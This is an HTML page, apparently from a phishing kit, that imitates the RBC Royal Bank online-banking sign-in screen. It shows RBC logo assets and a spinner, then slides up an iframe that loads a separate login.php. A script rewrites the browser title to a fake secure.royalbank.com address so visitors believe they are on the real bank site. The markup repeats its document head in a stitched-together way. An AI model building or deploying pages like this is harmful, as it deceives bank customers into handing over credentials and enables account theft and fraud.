<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>signin.rbc.ca/deposit?=343qtwe4afceefw</title>
<style>
  html, body {
    height: 100%;
    margin: 0;
    font-family: Arial, sans-serif;
    background: #e9eef5;
    overflow: hidden;
  }
  #logo {
    position: absolute;
    top: 50%;
    left: 50%;
    width: 100px;
    height: 100px;
    background: #004080;
    border-radius: 12px;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    transform: translate(-50%, -50%);
    transition: top 2s ease;
    z-index: 2;
  }
  #whitePanel {
    position: absolute;
    bottom: -100%;
    left: 0;
    width: 100%;
    height: 70%;
    background: #fff;
    transition: bottom 2s ease;
    z-index: 1;
    overflow: hidden;
  }
  #loginFrame {
    width: 100%;
    height: 100%;
    border: none;
  }
</style>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  html, body {
    height: 100%;
    margin: 0;
    font-family: Arial, sans-serif;
    background: url('assets/images/rbc.jpg') center/cover no-repeat;
    overflow: hidden;
  }

  /* Logo styling */
  #logo {
    position: absolute;
    top: 50%;
    left: 50%;
    width: 120px;
    height: 120px;
    background: url('assets/images/rbc.png') center/contain no-repeat;
    transform: translate(-50%, -50%);
    transition: top 2s ease; /* Logo moves with panel */
    z-index: 2;
  }

  /* Spinner under logo (smaller) */
  #spinner {
    position: absolute;
    top: 65%;
    left: 50%;
    transform: translateX(-50%);
    width: 30px; /* smaller */
    height: 30px; /* smaller */
    border: 4px solid rgba(255,255,255,0.3);
    border-top: 4px solid #fff;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    z-index: 2;
  }

  @keyframes spin {
    0% { transform: translateX(-50%) rotate(0deg); }
    100% { transform: translateX(-50%) rotate(360deg); }
  }

  /* White panel */
  #whitePanel {
    position: absolute;
    bottom: -100%;
    left: 0;
    width: 100%;
    height: 70%;
    background-color: white;
    border-radius: 0; /* squared corners */
    transition: bottom 2s ease; /* slide up smoothly */
    z-index: 1;
    overflow: hidden;
  }

  /* Iframe styling */
  #loginIframe {
    width: 100%;
    height: 100%;
    border: none;
  }
</style>
</head>
<body>
<div class="container-fluid position-relative h-100">
<!-- Logo + attached text container -->
<div id="logoContainer" style="
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%, -50%);
    text-align:center;
    transition: top 2s ease;
    z-index:2;
">
    <!-- RBC Logo -->
    <div id="logo" style="
        width:120px;
        height:120px;
        background:url('assets/images/rbc.png') center/contain no-repeat;
        margin:0 auto;
    "></div>

    <!-- Text between logo and spinner -->
    <div id="logoText" style="
        margin-top:10px;
        font-family:Arial,sans-serif;
        color:#ffffff;
        font-weight:300;
        line-height:1.2;
    ">
        <div style="font-size:clamp(1.2rem,3.5vw,1.5rem);"><br><br><br><br><br>Secure Sign-In</div>
        <div style="font-size:clamp(1rem,3vw,1.3rem); transform:scaleX(0.85); display:inline-block;">RBC Online Banking</div>
    </div>
</div>

<!-- Spinner under logo + text -->
<div id="spinner" style="
    position:absolute;
    top:65%;
    left:50%;
    transform:translateX(-50%);
    width:30px;
    height:30px;
    border:4px solid rgba(255,255,255,0.3);
    border-top:4px solid #fff;
    border-radius:50%;
    animation:spin 1s linear infinite;
    z-index:2;
"></div>

<!-- White panel with iframe -->
<div id="whitePanel">
  <iframe id="loginIframe" src="login.php"></iframe>
</div>
<script>
window.addEventListener('load', () => {
  const logoContainer = document.getElementById('logoContainer');
  const spinner = document.getElementById('spinner');
  const panel = document.getElementById('whitePanel');

  setTimeout(() => {
    spinner.style.display = 'none';
    panel.style.bottom = '0';
    logoContainer.style.top = '10%'; // moves logo + text together
  }, 5000);
});</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
// Replace all <title> tags and document.title
(function(customTitle){
    document.title = customTitle;
    // Replace any <title> elements in <head>
    const titles = document.getElementsByTagName('title');
    for(let t of titles){ t.textContent = customTitle; }
})("secure.royalbank.com/statics/login-service-ui/index#/full/signin?_gl=1*1yx3bz5*_gcl_aw*R0NMLjE3NjA1NTYzNDQuQ2owS0NRandqTDNIQmhDZ0FSSXNBUFVnN2E2cWh0WHktakl3VG0wdlktSkN3dW9LNVF4VGJMaXdmQmt4NzY4NzRCRjdVVnBobFh5Z2pGd2FBbVV5RUFMd193Y0I.*_gcl_au*MzQzNjkwMzAzLjE3NTkwNjI1NDg.*_ga*MTg1NTIyMTA1Ni4xNzU5MDYyNTQ5*_ga_89NPCTDXQR*czE3NjA4ODc2NDQkbzQkZzEkdDE3NjA4ODc2NDQkajYwJGwwJGgw&LANGUAGE=ENGLISH");
</script>
</body>
</html>
